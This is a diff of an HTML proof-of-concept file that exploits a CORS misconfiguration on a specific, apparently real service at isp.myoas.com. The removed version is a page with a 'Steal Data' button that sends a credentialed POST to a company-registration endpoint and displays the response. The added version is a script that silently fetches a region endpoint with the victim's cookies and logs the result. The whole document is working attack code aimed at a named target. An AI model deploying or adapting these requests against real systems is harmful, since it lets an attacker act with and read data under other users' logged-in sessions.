@@ -1,39 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CORS Exploitation PoC</title>
-</head>
-<body>
-  <h1>Exploit CORS Misconfiguration</h1>
-  <button id="exploit">Steal Data</button>
-  <div id="result"></div>
-
-  <script>
-    document.getElementById("exploit").addEventListener("click", function() {
-      fetch("https://isp.myoas.com/spfm/public/gsrm/v1/isp/companies/register", {
-        method: "POST",
-        credentials: "include", // Send cookies and credentials with the request
-        headers: {
-          "Content-Type": "application/json;charset=UTF-8",
-          "Accept": "application/json, text/plain, */*"
-        },
-        body: JSON.stringify({
-          companyBasic: {
-            companyName: "Test Exploit",
-            _token: "ExploitToken123"
-          }
-        })
-      })
-      .then(response => response.json()) // Assuming the response is JSON
-      .then(data => {
-        document.getElementById("result").innerText = "Exploited Data: " + JSON.stringify(data);
-      })
-      .catch(err => {
-        document.getElementById("result").innerText = "Exploitation Failed: " + err;
-      });
-    });
-  </script>
-</body>
-</html>
+<script>
+  fetch("https://isp.myoas.com//smdm/public/gsrm/v2/lov/region?countryId=25&size=5020", {
+    credentials: "include"
+  })
+  .then(response => response.text())
+  .then(data => console.log("CORS Response:", data))
+  .catch(err => console.error("CORS Error:", err));
+</script>
